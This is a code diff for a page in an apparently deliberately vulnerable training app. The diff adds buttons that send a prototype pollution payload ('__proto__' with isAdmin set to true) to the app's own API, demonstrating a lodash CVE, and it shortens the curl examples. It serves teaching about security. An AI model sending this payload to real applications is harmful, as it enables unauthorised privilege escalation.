@@ -1,9 +1,34 @@
 import { FileJson, ArrowLeft } from "lucide-react";
 import { Card, CardHeader, CardTitle, CardDescription, CardContent } from "~/components/ui/card";
 import { CodeBlock } from "~/components/ui/code-block";
+import { Button } from "~/components/ui/button";
 import { Link } from "react-router";
+import { useState } from "react";
 
 export default function VulnerableComponentsPage() {
+  const [data, setData] = useState<any>(null);
+  const [loading, setLoading] = useState(false);
+
+  const fetchVersions = async () => {
+    setLoading(true);
+    const res = await fetch("/api/vulnerable-components");
+    const json = await res.json();
+    setData(json);
+    setLoading(false);
+  };
+
+  const testPollution = async () => {
+    setLoading(true);
+    const res = await fetch("/api/vulnerable-components", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ "__proto__": { "isAdmin": true } })
+    });
+    const json = await res.json();
+    setData(json);
+    setLoading(false);
+  };
+
   return (
     <div className="min-h-screen bg-slate-950">
       <header className="border-b border-slate-800 bg-slate-900/50 px-4 py-4">
@@ -62,16 +87,25 @@ export default function VulnerableComponentsPage() {
           <CardContent className="space-y-4">
             <div>
               <h4 className="mb-2 font-medium text-slate-300">Step 1: Exploit Prototype Pollution</h4>
+              <div className="flex flex-wrap gap-2 mb-4">
+                <Button onClick={fetchVersions} disabled={loading} variant="destructive" size="sm">
+                  {loading && !data?.payload ? "Loading..." : "Check Versions"}
+                </Button>
+                <Button onClick={testPollution} disabled={loading} variant="destructive" size="sm">
+                  {loading && data?.payload ? "Testing..." : "Test Prototype Pollution"}
+                </Button>
+              </div>
+              {data && (
+                <div className="mt-3 rounded-md border border-rose-500/30 bg-rose-500/10 p-3">
+                  <pre className="text-xs text-rose-300 overflow-auto">{JSON.stringify(data, null, 2)}</pre>
+                </div>
+              )}
               <CodeBlock code={`# View vulnerable package versions
-curl "<your-worker-url>/api/vulnerable-components"
+/api/vulnerable-components
 
 # Exploit CVE-2019-10744 - Prototype Pollution in lodash
-curl -X POST "<your-worker-url>/api/vulnerable-components" \\
-  -H "Content-Type: application/json" \\
-  -d '{"__proto__": {"isAdmin": true}}'
-
-# View prototype pollution demo
-curl "<your-worker-url>/api/vulnerable-components?demo=pollute"`} />
+POST /api/vulnerable-components
+{"__proto__": {"isAdmin": true}}`} />
             </div>
             <div className="rounded-md bg-rose-500/10 p-3">
               <p className="text-sm text-rose-400">
